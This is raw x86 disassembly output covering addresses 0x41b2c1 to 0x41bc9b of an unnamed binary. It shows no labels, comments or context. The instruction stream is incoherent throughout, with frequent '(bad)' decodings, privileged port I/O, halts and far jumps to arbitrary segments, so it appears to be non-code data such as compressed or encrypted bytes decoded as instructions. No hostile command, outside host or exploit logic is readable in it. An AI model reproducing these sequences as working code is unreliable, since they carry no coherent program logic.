  41b2c1:	push   esp
  41b2c2:	addr16 callw 0x66ae
  41b2c7:	add    al,0xca
  41b2c9:	scas   al,BYTE PTR es:[edi]
  41b2ca:	fimul  WORD PTR [edx+0x457171a0]
  41b2d0:	dec    edi
  41b2d1:	stc    
  41b2d2:	cwde   
  41b2d3:	sub    al,0xf8
  41b2d5:	scas   eax,DWORD PTR es:[edi]
  41b2d6:	ins    BYTE PTR es:[edi],dx
  41b2d7:	sbb    al,0x13
  41b2d9:	inc    ebp
  41b2da:	xor    BYTE PTR [eax-0x63],ah
  41b2dd:	cld    
  41b2de:	das    
  41b2df:	xlat   BYTE PTR ds:[ebx]
  41b2e0:	out    dx,al
  41b2e1:	push   cs
  41b2e2:	and    al,0x4d
  41b2e4:	dec    eax
  41b2e5:	xchg   edi,eax
  41b2e6:	add    eax,0x6f259347
  41b2eb:	stc    
  41b2ec:	cmp    al,0xc
  41b2ee:	outs   dx,DWORD PTR ds:[esi]
  41b2ef:	sahf   
  41b2f0:	test   al,0x26
  41b2f2:	mov    al,0x13
  41b2f4:	les    eax,FWORD PTR [edi+0x62bad567]
  41b2fa:	fstp   QWORD PTR [edx+0x40a6333]
  41b300:	mov    dh,0xd4
  41b302:	clc    
  41b303:	pop    DWORD PTR [ecx]
  41b305:	ins    BYTE PTR es:[edi],dx
  41b306:	mov    DWORD PTR [ebp+0x2154a3f0],esp
  41b30c:	int3   
  41b30d:	int    0x9e
  41b30f:	into   
  41b310:	ret    0x9e07
  41b313:	push   edx
  41b314:	aas    
  41b315:	inc    ecx
  41b316:	aam    0xcf
  41b318:	es dec ebp
  41b31a:	pushf  
  41b31b:	xor    al,0x80
  41b31d:	dec    ebx
  41b31e:	xchg   esp,eax
  41b31f:	sbb    al,0x4f
  41b321:	ins    DWORD PTR es:[edi],dx
  41b322:	repnz retf 0xf7fe
  41b326:	fisub  WORD PTR [ecx+0x52]
  41b329:	push   esp
  41b32a:	sub    al,0x62
  41b32c:	mov    al,ds:0xd44113ce
  41b331:	dec    eax
  41b332:	jns    0x41b317
  41b334:	rol    DWORD PTR [eax],0x0
	...
  41b393:	add    BYTE PTR [eax],al
  41b395:	add    BYTE PTR [eax+0xd],cl
  41b398:	sbb    eax,0xfebb5dab
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	sub    eax,0xf785409
  41b3a7:	pop    ds
  41b3a8:	add    DWORD PTR [eax],eax
  41b3aa:	pop    es
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    dl,cl
  41b3af:	xchg   edx,eax
  41b3b0:	fnstenv [ebp+ecx*4-0x42]
  41b3b4:	jecxz  0x41b3de
  41b3b6:	lahf   
  41b3b7:	inc    ecx
  41b3b8:	xor    BYTE PTR [ebx-0x53],0x3
  41b3bc:	dec    esp
  41b3bd:	das    
  41b3be:	icebp  
  41b3bf:	xor    al,0xad
  41b3c1:	lds    ecx,FWORD PTR [esi+0x33041987]
  41b3c7:	mov    esp,0x75361773
  41b3cc:	lea    esp,[edi+0x2]
  41b3cf:	xchg   esp,eax
  41b3d0:	push   edi
  41b3d1:	outs   dx,BYTE PTR ds:[esi]
  41b3d2:	push   es
  41b3d3:	in     al,dx
  41b3d4:	jnp    0x41b439
  41b3d6:	add    edi,DWORD PTR [ebx-0x36]
  41b3d9:	es ds xchg edx,eax
  41b3dc:	or     DWORD PTR [eax+0x2212bc1e],0xffffffbd
  41b3e3:	hlt    
  41b3e4:	sbb    ch,BYTE PTR [ecx]
  41b3e6:	inc    ecx
  41b3e7:	push   esp
  41b3e8:	add    BYTE PTR [eax+esi*2+0x18],bh
  41b3ec:	setno  BYTE PTR [esi-0x62]
  41b3f0:	mov    eax,0x1d055b06
  41b3f6:	push   ecx
  41b3f7:	fcomp  QWORD PTR [edi+eiz*1]
  41b3fa:	outs   dx,DWORD PTR ds:[esi]
  41b3fb:	cwde   
  41b3fc:	sbb    dh,BYTE PTR [edx-0x36]
  41b3ff:	mov    edi,0xfd50ee0e
  41b404:	adc    edi,DWORD PTR [edi*1+0x3a620bba]
  41b40b:	push   0xffffffad
  41b40d:	mov    edx,0x842b646e
  41b412:	add    ebx,DWORD PTR [eax+0xa]
  41b415:	push   cs
  41b416:	lock retf 
  41b418:	stos   BYTE PTR es:[edi],al
  41b419:	adc    DWORD PTR [ecx-0x564bd028],esi
  41b41f:	add    dh,BYTE PTR ds:0xd7ff9737
  41b425:	xchg   ebp,eax
  41b426:	adc    BYTE PTR [ecx],ah
  41b428:	inc    ecx
  41b429:	mov    eax,0x256a027b
  41b42e:	cld    
  41b42f:	cs jnp 0x41b410
  41b432:	push   es
  41b433:	ficomp WORD PTR [eax+0x44]
  41b436:	push   ecx
  41b437:	or     al,0x51
  41b439:	xor    al,0x34
  41b43b:	xor    dh,BYTE PTR ds:0x50431317
  41b441:	sub    ebp,edx
  41b443:	dec    esi
  41b444:	or     eax,0x50e07a85
  41b449:	or     BYTE PTR [ebp+0x5983d02b],bl
  41b44f:	push   esp
  41b450:	scas   eax,DWORD PTR es:[edi]
  41b451:	or     DWORD PTR [edx+0x13],edi
  41b454:	in     al,0xa4
  41b456:	(bad)  [edx+0x570e478f]
  41b45c:	mov    bl,0xcd
  41b45e:	cmp    edi,0xffffffa8
  41b461:	mov    al,ds:0x2d78220e
  41b466:	push   edi
  41b467:	jbe    0x41b439
  41b469:	pop    es
  41b46a:	xchg   DWORD PTR [ebp-0x7680d406],edi
  41b470:	iret   
  41b471:	dec    ecx
  41b472:	push   0x1898948f
  41b477:	js     0x41b4d9
  41b479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b47a:	push   ebp
  41b47b:	jno    0x41b48b
  41b47d:	sbb    edx,DWORD PTR [ebx-0x36c1a8e7]
  41b483:	jno    0x41b4ab
  41b485:	enter  0x93d4,0x72
  41b489:	sbb    ebp,DWORD PTR [edx+ecx*1-0x4793c591]
  41b490:	sub    eax,0x665d6e0b
  41b495:	and    bh,BYTE PTR [ebx*1+0x6642dbd7]
  41b49c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b49d:	sbb    dh,BYTE PTR [edi+0x38]
  41b4a0:	dec    ebx
  41b4a1:	sbb    eax,0xbf64dd35
  41b4a6:	test   al,0x3e
  41b4a8:	jp     0x41b445
  41b4aa:	rol    DWORD PTR [ebx+0x60],0x8f
  41b4ae:	ja     0x41b440
  41b4b0:	push   0xa4ff7937
	...
  41b515:	add    ah,dl
  41b517:	in     al,dx
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	das    
  41b523:	ss shl eax,cl
  41b526:	push   ss
  41b527:	and    BYTE PTR [ecx],al
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR ds:0xf16b94db,cl
  41b533:	push   cs
  41b534:	arpl   WORD PTR [ecx],bx
  41b536:	xor    eax,0xa7922723
  41b53b:	mov    al,0x82
  41b53d:	pop    eax
  41b53e:	test   al,0x15
  41b540:	mov    edx,0x8618fae9
  41b545:	mov    al,ds:0x103e7cbc
  41b54a:	test   eax,0xebc70921
  41b54f:	pusha  
  41b550:	test   al,0x40
  41b552:	dec    ebp
  41b553:	ucomiss xmm1,xmm3
  41b556:	les    edx,FWORD PTR [ebx]
  41b558:	fldenv [ebp+edx*1-0x7b]
  41b55c:	(bad)  
  41b55e:	xchg   ecx,eax
  41b55f:	sub    BYTE PTR [esi],dl
  41b561:	icebp  
  41b562:	cwde   
  41b563:	sub    ax,0xdd02
  41b567:	ror    DWORD PTR [edx],cl
  41b569:	sub    BYTE PTR [ecx],0x1e
  41b56c:	push   edx
  41b56d:	xchg   esp,eax
  41b56e:	fs push eax
  41b570:	es cmp eax,0xeb0ec53e
  41b576:	imul   edi,eax,0xffffff97
  41b579:	(bad)  
  41b57b:	add    BYTE PTR [esi-0x46aea133],0x5e
  41b582:	or     al,0x82
  41b584:	mov    ebx,0x5276dec2
  41b589:	leave  
  41b58a:	stc    
  41b58b:	jne    0x41b5b1
  41b58d:	xchg   BYTE PTR [edx],dl
  41b58f:	mov    dl,BYTE PTR [ebx+0x12]
  41b592:	sub    al,0x4b
  41b594:	inc    ecx
  41b595:	out    dx,eax
  41b596:	mov    ah,0x1d
  41b598:	mov    ch,BYTE PTR [ecx-0x67]
  41b59b:	add    eax,0xdb6c6c71
  41b5a0:	cdq    
  41b5a1:	inc    ebx
  41b5a2:	enter  0x6ea5,0x39
  41b5a6:	repnz cmp ah,BYTE PTR [edi-0x7d259b13]
  41b5ad:	cld    
  41b5ae:	push   es
  41b5af:	sub    al,0xc7
  41b5b1:	fistp  QWORD PTR [ebx]
  41b5b3:	(bad)  
  41b5b4:	loopne 0x41b625
  41b5b6:	jno    0x41b572
  41b5b8:	test   ch,al
  41b5ba:	push   ecx
  41b5bb:	push   edi
  41b5bc:	arpl   bx,bx
  41b5be:	jge    0x41b63c
  41b5c0:	mov    ds:0xabccf1c0,al
  41b5c5:	int    0x42
  41b5c7:	mov    bl,0xdb
  41b5c9:	loopne 0x41b5f8
  41b5cb:	rol    bl,0x5b
  41b5ce:	cmc    
  41b5cf:	or     BYTE PTR [edx-0x5b],0x3a
  41b5d3:	pusha  
  41b5d4:	dec    eax
  41b5d5:	outs   dx,BYTE PTR ds:[esi]
  41b5d6:	(bad)  
  41b5d7:	daa    
  41b5d8:	mov    ecx,0x9bc08da4
  41b5dd:	popf   
  41b5de:	fwait
  41b5df:	out    0xe8,al
  41b5e1:	inc    ebp
  41b5e2:	repz mov ebx,cs
  41b5e5:	cmp    DWORD PTR [ebp-0x13],esp
  41b5e8:	pop    edi
  41b5e9:	push   cs
  41b5ea:	bound  esp,QWORD PTR [edx+0x101c5fa6]
  41b5f0:	sahf   
  41b5f1:	das    
  41b5f2:	clc    
  41b5f3:	sbb    ecx,DWORD PTR [ebx+0x79e78827]
  41b5f9:	test   DWORD PTR [esi],ecx
  41b5fb:	add    eax,0x36162f31
  41b600:	adc    DWORD PTR [edi+eax*1-0x57ea326b],eax
  41b607:	(bad)  
  41b608:	int    0xc6
  41b60a:	xchg   ebx,eax
  41b60b:	mov    dh,0x4f
  41b60d:	dec    eax
  41b60e:	daa    
  41b60f:	sbb    al,0x64
  41b611:	test   BYTE PTR [esi-0x717170b5],dh
  41b617:	mov    edi,0x506d7857
  41b61c:	lods   eax,DWORD PTR ds:[esi]
  41b61d:	loop   0x41b5a6
  41b61f:	stos   DWORD PTR es:[edi],eax
  41b620:	rcr    DWORD PTR [eax],1
  41b622:	mov    ebp,0x7911466d
  41b627:	test   al,0xf9
  41b629:	mov    ebx,0x5f30c839
  41b62e:	test   BYTE PTR [ebx],cl
  41b630:	jne    0x41b6a1
  41b632:	push   0x82ab
	...
  41b693:	add    BYTE PTR [eax],al
  41b695:	add    BYTE PTR [eax-0x2469e49d],ch
  41b69b:	(bad)  
  41b69c:	lods   eax,DWORD PTR ds:[esi]
  41b69d:	jg     0x41b6db
  41b69f:	sub    al,dl
  41b6a1:	add    BYTE PTR ds:0x1df23a73,al
  41b6a7:	and    DWORD PTR [ecx],eax
  41b6a9:	add    BYTE PTR [edi],al
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    bl,bh
  41b6af:	dec    eax
  41b6b0:	sti    
  41b6b1:	js     0x41b68c
  41b6b3:	jnp    0x41b6ed
  41b6b5:	inc    edi
  41b6b6:	stos   BYTE PTR es:[edi],al
  41b6b7:	pop    edi
  41b6b8:	push   0x20
  41b6ba:	jmp    0x41b6d4
  41b6bc:	sbb    al,ah
  41b6be:	(bad)  
  41b6bf:	cwde   
  41b6c0:	cmc    
  41b6c1:	add    al,0x54
  41b6c3:	imul   ebx,DWORD PTR [edi],0xfffffff8
  41b6c6:	rol    DWORD PTR [edx+0x2b],1
  41b6c9:	or     eax,0x5739e889
  41b6ce:	test   eax,0xd4a7f9d2
  41b6d3:	xor    DWORD PTR [ebx-0x3a],esi
  41b6d6:	fimul  DWORD PTR [edi+0x4982205d]
  41b6dc:	loopne 0x41b6d9
  41b6de:	inc    ebx
  41b6df:	and    bl,BYTE PTR [ebx+eax*4-0x2c]
  41b6e3:	jl     0x41b752
  41b6e5:	push   edx
  41b6e6:	je     0x41b6d6
  41b6e8:	in     eax,dx
  41b6e9:	and    cl,BYTE PTR [ecx+0x66]
  41b6ec:	sub    BYTE PTR [esi-0x51],dl
  41b6ef:	repz xlat BYTE PTR ds:[ebx]
  41b6f1:	fwait
  41b6f2:	mov    BYTE PTR [edi],0x98
  41b6f5:	lock cmp DWORD PTR [esi],ebp
  41b6f8:	xchg   ebx,eax
  41b6f9:	mov    edi,0xee2b7b19
  41b6fe:	jnp    0x41b6be
  41b700:	or     eax,0xcaebbb53
  41b705:	push   cs
  41b706:	mov    eax,0x1953bf11
  41b70b:	xor    al,0xdb
  41b70d:	lods   al,BYTE PTR ds:[esi]
  41b70e:	add    esi,ebp
  41b710:	stc    
  41b711:	mov    dh,0xd8
  41b713:	and    al,0x82
  41b715:	or     DWORD PTR [edx],ebp
  41b717:	add    eax,0xee0d8527
  41b71c:	stos   BYTE PTR es:[edi],al
  41b71d:	sti    
  41b71e:	pusha  
  41b71f:	das    
  41b720:	imul   ebx,DWORD PTR [ebp+0xa5d7aa],0xffffffc3
  41b727:	mov    dl,0x9d
  41b729:	sub    al,BYTE PTR [ebx]
  41b72b:	dec    ebx
  41b72c:	sbb    BYTE PTR [ebx],0x1b
  41b72f:	jno    0x41b757
  41b731:	gs xor dl,al
  41b734:	mov    WORD PTR [ebx+ecx*4+0x795083f0],?
  41b73b:	mov    ebp,0x74dda66c
  41b740:	inc    ecx
  41b741:	lods   al,BYTE PTR ds:[esi]
  41b742:	adc    al,0xc2
  41b744:	mov    eax,ds:0xc43751db
  41b749:	pushf  
  41b74a:	jb     0x41b6d8
  41b74c:	mov    BYTE PTR [ebx+0x26],ah
  41b74f:	add    al,0x80
  41b751:	sbb    eax,DWORD PTR [ecx+0x6eb882c6]
  41b757:	(bad)  
  41b758:	dec    ecx
  41b759:	iret   
  41b75a:	push   ebp
  41b75b:	rol    DWORD PTR [edi-0x27061fee],0x4b
  41b762:	(bad)  
  41b763:	mov    eax,ds:0x52df0936
  41b768:	inc    ebp
  41b769:	sbb    al,0x28
  41b76b:	or     DWORD PTR [ebx+0x4a],ecx
  41b76e:	aaa    
  41b76f:	pushf  
  41b770:	jmp    DWORD PTR [edi-0x1a648b7d]
  41b776:	je     0x41b788
  41b778:	jnp    0x41b793
  41b77a:	std    
  41b77b:	js     0x41b724
  41b77d:	mov    WORD PTR [edx+0x71927a9e],gs
  41b783:	into   
  41b784:	jmp    0x3b6197a4
  41b789:	sbb    BYTE PTR [edx+0x50],ah
  41b78c:	inc    edi
  41b78d:	jb     0x41b801
  41b78f:	dec    ebp
  41b790:	test   BYTE PTR [ebp-0x34],0x85
  41b794:	or     BYTE PTR [edx+0x0],bl
  41b797:	xchg   ecx,eax
  41b798:	mov    eax,ds:0xa93dd6e9
  41b79d:	mov    ds:0x9bb54905,eax
  41b7a2:	xlat   BYTE PTR ds:[ebx]
  41b7a3:	pop    esp
  41b7a4:	int    0xa9
  41b7a6:	aas    
  41b7a7:	push   esp
  41b7a8:	in     eax,dx
  41b7a9:	xchg   edx,eax
  41b7aa:	or     ebx,DWORD PTR [eax-0x4d]
  41b7ad:	les    edi,FWORD PTR [esi]
  41b7af:	into   
  41b7b0:	lahf   
  41b7b1:	push   ss
  41b7b2:	sub    edx,DWORD PTR [esi]
  41b7b4:	rol    DWORD PTR [eax],0x0
	...
  41b813:	add    BYTE PTR [eax],al
  41b815:	add    BYTE PTR [edx-0x8b13804],cl
  41b81b:	jg     0x41b7a8
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0x85,al
  41b823:	pop    ebp
  41b824:	mov    edi,0x1222439
  41b829:	add    BYTE PTR [edi],al
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR [edi],ch
  41b82f:	xchg   BYTE PTR [ebx+edx*1],ch
  41b832:	push   ebp
  41b833:	pop    edi
  41b834:	pop    edx
  41b835:	jg     0x41b850
  41b837:	retf   0xd246
  41b83a:	jb     0x41b89a
  41b83c:	adc    al,0xb9
  41b83e:	shl    edi,0x38
  41b841:	scas   al,BYTE PTR es:[edi]
  41b842:	dec    ecx
  41b843:	xchg   esi,eax
  41b844:	mov    eax,ds:0x35186778
  41b849:	jle    0x41b837
  41b84b:	sbb    DWORD PTR [edx+0x2bd8aa8a],ecx
  41b851:	out    dx,eax
  41b852:	mov    dl,0x7a
  41b854:	and    eax,0x7e471864
  41b859:	xchg   BYTE PTR [ebp+0x3],ch
  41b85c:	pop    es
  41b85d:	scas   al,BYTE PTR es:[edi]
  41b85e:	mov    ebx,0xa3460ced
  41b863:	jle    0x41b86e
  41b865:	and    eax,0x8eace3df
  41b86a:	add    eax,DWORD PTR [eax]
  41b86c:	sub    DWORD PTR [edi+0x0],ebp
  41b86f:	pop    ebp
  41b870:	sbb    ebp,ebp
  41b872:	ja     0x41b852
  41b874:	jns    0x41b831
  41b876:	push   es
  41b877:	pop    es
  41b878:	inc    eax
  41b879:	xor    esi,DWORD PTR [edi+esi*2-0x47]
  41b87d:	jecxz  0x41b880
  41b87f:	cmp    DWORD PTR [ecx+eax*1+0x353df6f8],ecx
  41b886:	retf   0xe5f8
  41b889:	cmp    al,0x37
  41b88b:	inc    esp
  41b88c:	rcl    DWORD PTR [esi+edx*4+0x64f5ba1d],cl
  41b893:	scas   eax,DWORD PTR es:[edi]
  41b894:	pop    ecx
  41b895:	jge    0x41b8a3
  41b897:	rcl    edi,1
  41b899:	js     0x41b823
  41b89b:	xchg   edi,eax
  41b89c:	adc    ah,0xc8
  41b89f:	mov    ah,ch
  41b8a1:	push   ebx
  41b8a2:	inc    edx
  41b8a3:	cwde   
  41b8a4:	xchg   ecx,eax
  41b8a5:	ja     0x41b889
  41b8a7:	fild   DWORD PTR [ebp+0x4d]
  41b8aa:	and    BYTE PTR ss:[eax+ebp*1+0x38d14df5],dh
  41b8b2:	inc    esp
  41b8b3:	mov    al,ds:0xad574a74
  41b8b8:	cmp    bl,BYTE PTR [ecx-0x76eaff50]
  41b8be:	das    
  41b8bf:	in     al,0x23
  41b8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8c2:	xchg   esp,eax
  41b8c3:	test   eax,esp
  41b8c5:	mov    bl,BYTE PTR [ecx+0x27]
  41b8c8:	bound  edx,QWORD PTR [ecx]
  41b8ca:	(bad)  
  41b8cb:	xor    ebp,DWORD PTR [edi+ebx*4-0x76]
  41b8cf:	cmp    esi,DWORD PTR [edi]
  41b8d1:	int    0xe4
  41b8d3:	jl     0x41b866
  41b8d5:	jno    0x41b8bb
  41b8d7:	inc    esp
  41b8d8:	xchg   edx,eax
  41b8d9:	inc    esi
  41b8da:	lock outs dx,DWORD PTR ds:[esi]
  41b8dc:	pop    edi
  41b8dd:	fist   WORD PTR [eax-0x75]
  41b8e0:	out    dx,al
  41b8e1:	adc    ecx,DWORD PTR [ebp+0x27407e49]
  41b8e7:	jmp    DWORD PTR [eax+0x5a]
  41b8ea:	sti    
  41b8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8ec:	cdq    
  41b8ed:	push   esi
  41b8ee:	xor    ecx,esi
  41b8f0:	mov    ebx,DWORD PTR [eax]
  41b8f2:	mov    esp,0xdac82849
  41b8f7:	dec    edx
  41b8f8:	fadd   QWORD PTR [edi+0x2822db73]
  41b8fe:	into   
  41b8ff:	mov    ds:0xbae5b581,al
  41b904:	xchg   ecx,eax
  41b905:	(bad)  
  41b906:	adc    esi,DWORD PTR [ecx]
  41b908:	stos   BYTE PTR es:[edi],al
  41b909:	nop
  41b90a:	fs pop eax
  41b90c:	sub    ebx,eax
  41b90e:	es add eax,0xb964d929
  41b914:	loopne 0x41b96e
  41b916:	cmp    BYTE PTR [edx+0x47],0x8f
  41b91a:	add    eax,esp
  41b91c:	inc    esi
  41b91d:	hlt    
  41b91e:	xlat   BYTE PTR ds:[ebx]
  41b91f:	adc    esi,DWORD PTR [esi+ebp*8]
  41b922:	mov    edi,0x4f5185f4
  41b927:	pop    edx
  41b928:	std    
  41b929:	or     cl,BYTE PTR [esi+0x3]
  41b92c:	cli    
  41b92d:	push   ebx
  41b92e:	leave  
  41b92f:	sar    DWORD PTR [ebx+0x5e],1
  41b932:	dec    eax
  41b933:	xor    DWORD PTR [ecx+0x0],ecx
	...
  41b996:	ret    
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	jmp    0x123:0x2bd21157
  41b9a9:	add    BYTE PTR [edi],al
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    BYTE PTR [eax+0x64],bh
  41b9b0:	imul   eax,DWORD PTR [eax+0x7c],0xb744337d
  41b9b7:	lahf   
  41b9b8:	mov    eax,ds:0x6ceced31
  41b9bd:	inc    edi
  41b9be:	leave  
  41b9bf:	cmovno ebp,DWORD PTR [edx]
  41b9c2:	cmp    eax,0x31b1a971
  41b9c7:	and    BYTE PTR ds:0x114b5c8e,ah
  41b9cd:	inc    edx
  41b9ce:	jl     0x41b951
  41b9d0:	(bad)  
  41b9d1:	jmp    0xb87d:0xd6feeaf5
  41b9d8:	mov    ch,0x9d
  41b9da:	leave  
  41b9db:	mov    esi,0x1d9ba06
  41b9e0:	setle  ah
  41b9e3:	push   0xe3b5f1d
  41b9e8:	jmp    0x3860:0x46e7653f
  41b9ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9f0:	hlt    
  41b9f1:	scas   eax,DWORD PTR es:[edi]
  41b9f2:	add    BYTE PTR [ecx+eax*8-0x71],cl
  41b9f6:	and    esp,DWORD PTR [ebx-0x5e]
  41b9f9:	fistp  DWORD PTR [edx-0x34ab34ac]
  41b9ff:	popf   
  41ba00:	mov    dh,0x6c
  41ba02:	sbb    DWORD PTR [ebx-0x1],ecx
  41ba05:	clc    
  41ba06:	sbb    al,0x1a
  41ba08:	or     dh,BYTE PTR [ecx-0xa]
  41ba0b:	xchg   ebx,eax
  41ba0c:	cmp    BYTE PTR [esi],dl
  41ba0e:	sub    ch,BYTE PTR [edx+ecx*8-0x7c]
  41ba12:	pushf  
  41ba13:	pop    ds
  41ba14:	aam    0x68
  41ba16:	mov    esp,ecx
  41ba18:	push   eax
  41ba1a:	xchg   di,ax
  41ba1c:	in     al,dx
  41ba1d:	faddp  st(2),st
  41ba1f:	pop    edx
  41ba20:	push   ss
  41ba21:	cmp    ch,dl
  41ba23:	or     eax,DWORD PTR fs:[edi-0x11a98288]
  41ba2a:	and    al,ch
  41ba2c:	inc    ebp
  41ba2d:	mov    dh,0xb9
  41ba2f:	(bad)  [edx-0x44]
  41ba32:	or     eax,0xce58988c
  41ba37:	call   0x123b6882
  41ba3c:	hlt    
  41ba3d:	xchg   esp,esi
  41ba3f:	push   ecx
  41ba40:	jno    0x41ba33
  41ba42:	out    0x2a,al
  41ba44:	sti    
  41ba45:	addr16 dec esp
  41ba47:	xchg   BYTE PTR [ecx],dl
  41ba49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba4a:	mov    ecx,DWORD PTR [esi-0x349147d5]
  41ba50:	mov    ebp,0xa3087ab4
  41ba55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba56:	xor    eax,0xd61dd01f
  41ba5b:	jae    0x41ba35
  41ba5d:	inc    ebx
  41ba5e:	int3   
  41ba5f:	fmul   DWORD PTR [ecx]
  41ba61:	nop
  41ba62:	arpl   si,bx
  41ba64:	xchg   DWORD PTR [eax+0x2811ba2a],esp
  41ba6a:	iret   
  41ba6b:	xor    edi,DWORD PTR [edx]
  41ba6d:	rol    DWORD PTR [ecx],0x1a
  41ba70:	mov    BYTE PTR [esp+eax*2],dl
  41ba73:	pop    ds
  41ba74:	inc    esi
  41ba75:	xor    eax,0x8aeacdf1
  41ba7a:	pusha  
  41ba7b:	out    0x56,al
  41ba7d:	push   ss
  41ba7e:	add    bh,dl
  41ba80:	jecxz  0x41bae4
  41ba82:	or     al,0xab
  41ba84:	sbb    BYTE PTR [esi+0x70],0x31
  41ba88:	dec    DWORD PTR [ebx]
  41ba8a:	mov    al,BYTE PTR [esi]
  41ba8c:	pushf  
  41ba8d:	adc    BYTE PTR [edi+0x7cc886c2],al
  41ba93:	jbe    0x41bb04
  41ba95:	mov    bl,0x4a
  41ba97:	push   ecx
  41ba98:	adc    BYTE PTR [esi-0x65],0xe4
  41ba9c:	ins    DWORD PTR es:[edi],dx
  41ba9d:	les    eax,FWORD PTR [ecx+esi*8-0x34ec988]
  41baa4:	xchg   ecx,eax
  41baa5:	push   ss
  41baa6:	mov    esp,0x526fe165
  41baab:	shr    DWORD PTR ds:0x45f6d460,cl
  41bab1:	imul   ebx,ebx,0xf12c
	...
  41bb13:	add    BYTE PTR [eax],al
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	popa   
  41bb23:	std    
  41bb24:	and    BYTE PTR [ebx+0x32],bh
  41bb27:	and    al,0x1
  41bb29:	add    BYTE PTR [edi],al
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [ebx+0x2afcf13e],cl
  41bb33:	mov    ds:0x32f5f8d6,al
  41bb38:	in     al,dx
  41bb39:	push   cs
  41bb3a:	mov    bh,0x78
  41bb3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb3d:	sub    eax,ebp
  41bb3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb40:	stc    
  41bb41:	pushf  
  41bb42:	pop    esp
  41bb43:	les    eax,FWORD PTR [ecx+0x1e]
  41bb46:	or     BYTE PTR [edx],al
  41bb48:	test   eax,0xe17b8bdb
  41bb4d:	loope  0x41bb81
  41bb4f:	jecxz  0x41baf7
  41bb51:	inc    eax
  41bb52:	jae    0x41bb53
  41bb54:	call   0xfcc2:0x4d9741a7
  41bb5b:	fs or  al,0x8a
  41bb5e:	push   edx
  41bb5f:	jae    0x41baef
  41bb61:	mov    ah,0x69
  41bb63:	push   edx
  41bb64:	push   ss
  41bb65:	dec    edx
  41bb66:	lea    ecx,[ebp+0x68]
  41bb69:	cmc    
  41bb6a:	popa   
  41bb6b:	cmp    bh,bl
  41bb6d:	aaa    
  41bb6e:	push   edi
  41bb6f:	add    BYTE PTR [edi],bh
  41bb71:	add    eax,0xe903b20a
  41bb76:	mov    bl,0x9f
  41bb78:	pop    esi
  41bb79:	fdiv   st,st(0)
  41bb7b:	cmp    DWORD PTR [edi-0x2cbae61],ebx
  41bb81:	xchg   edi,eax
  41bb82:	jecxz  0x41bb5e
  41bb84:	sbb    esi,DWORD PTR [eax+ebp*2]
  41bb87:	fld    QWORD PTR [esi]
  41bb89:	addr16 mov esi,0xafda561d
  41bb8f:	push   eax
  41bb90:	sbb    al,0xd5
  41bb92:	xor    dh,BYTE PTR [ebx-0x1c]
  41bb95:	fdiv   QWORD PTR [ebp-0x228d975f]
  41bb9b:	icebp  
  41bb9c:	dec    edi
  41bb9d:	call   0xc4e7:0x5058df2d
  41bba4:	jmp    0x2de7:0x96395649
  41bbab:	icebp  
  41bbac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbad:	dec    esi
  41bbae:	int3   
  41bbaf:	nop
  41bbb0:	pop    esp
  41bbb1:	jmp    0x68014e54
  41bbb6:	fldcw  WORD PTR [esp+esi*1+0x84c5304]
  41bbbd:	dec    ebp
  41bbbe:	cmp    DWORD PTR [eax],ebp
  41bbc0:	icebp  
  41bbc1:	jmp    0x920c:0xda933c4f
  41bbc8:	mov    edi,0x27710224
  41bbcd:	adc    al,0x96
  41bbcf:	mov    ch,0x7
  41bbd1:	push   es
  41bbd2:	xchg   ch,bh
  41bbd4:	xor    cl,0xf5
  41bbd7:	aas    
  41bbd8:	push   ss
  41bbd9:	shl    DWORD PTR [edx-0x58],1
  41bbdc:	sub    eax,0x97899e7
  41bbe1:	or     ecx,esp
  41bbe3:	inc    esi
  41bbe4:	xchg   esi,eax
  41bbe5:	repnz cld 
  41bbe7:	enter  0x203a,0x2f
  41bbeb:	ja     0x41bb9f
  41bbed:	out    0xe2,al
  41bbef:	out    dx,eax
  41bbf0:	sbb    eax,esp
  41bbf2:	or     BYTE PTR [edi],bl
  41bbf4:	dec    eax
  41bbf5:	in     al,0x92
  41bbf7:	mov    ch,0x80
  41bbf9:	aad    0x69
  41bbfb:	ror    BYTE PTR [esi],cl
  41bbfd:	mov    ebx,0x721f726f
  41bc02:	sbb    eax,0x5201adf
  41bc07:	push   0xffffffc9
  41bc09:	cmp    eax,0xcb7d57ab
  41bc0e:	test   BYTE PTR [ecx-0x44032513],0x4d
  41bc15:	sahf   
  41bc16:	and    eax,0x54180222
  41bc1b:	(bad)  
  41bc1c:	jp     0x41bc49
  41bc1e:	push   0x7ee2c12f
  41bc23:	adc    edx,edi
  41bc25:	inc    edx
  41bc26:	jmp    0xb212:0x1d368837
  41bc2d:	sub    eax,0x9d213dfc
  41bc32:	pop    ebp
  41bc33:	jmp    0x41bbba
	...
  41bc95:	add    dl,dl
  41bc97:	xor    bh,dl
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
